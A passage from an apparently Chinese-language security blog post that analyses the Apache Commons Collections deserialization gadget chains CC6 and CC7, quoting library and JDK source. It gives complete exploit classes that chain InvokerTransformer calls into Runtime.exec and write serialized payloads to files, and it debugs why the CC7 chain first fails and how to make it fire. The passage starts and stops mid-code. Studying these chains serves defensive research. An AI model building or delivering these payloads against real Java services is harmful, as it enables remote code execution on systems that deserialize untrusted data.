capacity and verify non-negative.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="keyword">if</span> (capacity &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal capacity: &quot;</span> +</span><br><span class="line">                                             capacity);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read load factor and verify positive and non NaN.</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read size and verify non-negative.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal size: &quot;</span> +</span><br><span class="line">                                             size);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set the capacity according to the size and load factor ensuring that</span></span><br><span class="line">        <span class="comment">// the HashMap is at least 25% full but clamping to maximum capacity.</span></span><br><span class="line">        capacity = (<span class="type">int</span>) Math.min(size * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">                HashMap.MAXIMUM_CAPACITY);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create backing HashMap</span></span><br><span class="line">        map = (((HashSet&lt;?&gt;)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>使用<code>HashSet</code>自带的<code>add()</code>方法会持续调用后面的<code>put()</code>、<code>hash()</code>方法，导致链在序列化前提前触发，这会污染我们构造的<code>map</code>对象，后面反序列化在<code>get()</code>时进入else语句，导致反序列化时无法正常执行命令。所以我们需要在创建<code>tiedEntry</code>时传入无害的<code>HashMap</code>，后面再通过反射修改<code>tiedEntry</code>的<code>map</code>字段为<code>lazyMap</code>，相当于让<code>lazyMap</code>绕过<code>add()</code>后面的方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.put(e, PRESENT)==<span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>全链如下，该链相对较短</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),<span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">map</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        map.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        map.set(tiedMapEntry, lazyMap);</span><br><span class="line"></span><br><span class="line">        serialize(hashSet);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc6.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;cc6.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="CommonsCollections7反序列化链"><a href="#CommonsCollections7反序列化链" class="headerlink" title="CommonsCollections7反序列化链"></a>CommonsCollections7反序列化链</h2><p>该链后段与CC1类似，区别在于<code>lazyMap</code>的上层调用不同，这一次我们选择<code>AbstractMap</code>类中的<code>equals()</code>方法，该类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">        <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">                Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">                <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>该<code>equals()</code>方法被<code>Hashtable</code>类的<code>reconstitutionPut()</code>方法调用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">        <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">        <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Creates the new entry.</span></span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">        tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>reconstitutionPut()</code>方法被<code>Hashtable</code>类的<code>readObject()</code>调用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the original length of the array and number of elements</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">origlength</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">elements</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Compute new size with a bit of room 5% to grow but</span></span><br><span class="line">        <span class="comment">// no larger than the original size.  Make the length</span></span><br><span class="line">        <span class="comment">// odd if it&#x27;s large enough, this helps distribute the entries.</span></span><br><span class="line">        <span class="comment">// Guard against the length ending up zero, that&#x27;s not valid.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> (<span class="type">int</span>)(elements * loadFactor) + (elements / <span class="number">20</span>) + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">            length--;</span><br><span class="line">        <span class="keyword">if</span> (origlength &gt; <span class="number">0</span> &amp;&amp; length &gt; origlength)</span><br><span class="line">            length = origlength;</span><br><span class="line">        table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[length];</span><br><span class="line">        threshold = (<span class="type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">        <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">            <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">            reconstitutionPut(table, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那么方法链就很明显了<code>readObject()</code>-&gt;<code>reconstitutionPut()</code>-&gt;<code>equals()</code>-&gt;<code>get()</code>，<code>readObject()</code>没有什么需要注意的地方，主要看<code>reconstitutionPut()</code>，要让<code>key</code>为构造的恶意<code>lazyMap</code></p><p>该方法将<code>readObject()</code>遍历出的每一个键值对的<code>key</code>与已遍历出的<code>key</code>进行比对，当<code>key</code>不重复时则会将其加入<code>table</code>这个键值对数组中。因为要与先前的<code>key</code>比对才会调用<code>equals()</code>，若<code>hashTable</code>中只有一个元素就不会触发<code>equals()</code>，这决定了我们后面要往里面传入两个<code>lazyMap</code></p><p>同时由于if语句里面是逻辑与运算，这还要求<code>e.hash == hash</code>必须为真才会进行后面的<code>equals()</code>运算，也就是当前遍历键值对的哈希与已有键值对的哈希相等，这里分别取<code>yy</code>和<code>zZ</code></p><p>由上可以构造出以下链</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;?,?&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap1,chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        HashMap&lt;?,?&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap2,chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Map&lt;?,?&gt;, Integer&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(lazyMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashtable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc7.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;cc7.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尝试运行，并没有在反序列化时弹出计算器，调试中发现在使用<code>put()</code>向<code>hashTable</code>传递<code>lazyMap2</code>时调用了<code>equals()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="comment">// Make sure the value is not null</span></span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">        Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">        <span class="keyword">for</span>(; entry != <span class="literal">null</span> ; entry = entry.next) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">                <span class="type">V</span> <span class="variable">old</span> <span class="operator">=</span> entry.value;</span><br><span class="line">                entry.value = value;</span><br><span class="line">                <span class="keyword">return</span> old;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>注意这里<code>equals()</code>比较的是两个不一样的<code>LazyMap</code></p><p><img src="/img/post/image-20260113115652321.png" alt="image-20260113115652321"></p><p><code>lazyMap1</code>没有重写<code>equals()</code>，调用的实际是父类<code>AbstractMapDecorator</code>的<code>equals()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> object == <span class="built_in">this</span> ? <span class="literal">true</span> : <span class="built_in">this</span>.map.equals(object);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的<code>this.map</code>是在<code>decorate()</code>时传入的<code>hashmap1</code>，在<code>decorate()</code>中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>使用了构造器，而在构造器中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>使用了父类的构造器，看父类构造器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractMapDecorator</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (map == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Map must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.map = map;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>传入了<code>hashmap1</code>，故<code>lazyMap</code>的<code>map</code>字段就是<code>hashmap1</code>，进入<code>HashMap</code>中的<code>equals()</code>，其实<code>HashMap</code>也没有重写<code>equals()</code>，用的是父类<code>AbstractMap</code>的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">        <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">                Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">                <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里对<code>hashMap1</code>进行了迭代，并尝试与<code>lazyMap2</code>进行比较，所以对<code>lazyMap2</code>调用了<code>get()</code>，再步入</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调试显示<code>key</code>是<code>yy</code>，这显然不存在于<code>super.map</code>字段也就是<code>hashmap2</code>里的，所以进入了if代码块，又往<code>hashMpa2</code>调用了<code>put()</code>，表现为<code>lazyMap2</code>多了一个键为<code>yy</code>，值为一个<code>ProcessImpl</code>对象的键值对，但是在反序列化时要对<code>lazyMap2</code>和<code>lazyMap1</code>进行长度比较，如果不匹配就会阻止后面的命令执行，所以在<code>put()</code>后还需要对多出来的键值对进行清除</p><p>全链如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title 